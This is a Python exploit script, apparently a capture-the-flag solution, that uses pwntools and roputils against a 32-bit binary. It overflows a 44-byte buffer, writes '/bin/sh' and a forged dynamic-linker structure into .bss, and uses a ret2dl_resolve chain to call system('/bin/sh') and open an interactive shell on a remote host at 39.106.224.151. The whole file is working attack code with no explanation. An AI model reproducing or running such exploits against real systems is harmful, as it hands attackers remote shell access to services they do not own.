import sys
import roputils
from pwn import *
#context.log_level = 'debug'
offset = 44
readplt = 0x08048390
bss = 0x0804a068
vulFunc = 0x0804852d

#p = process('./pwn')
#p = remote('da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com','33865')
p = remote('39.106.224.151','60005')
rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss')

# step1 : write sh & resolve struct to bss
buf1 = 'A' * offset #44
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20, 'system')
buf2 += rop.fill(100, buf2)
p.send(buf2)

#gdb.attach(p)
#step2 : use dl_resolve_call get system & system('/bin/sh')
buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)
p.send(buf3)
p.interactive()
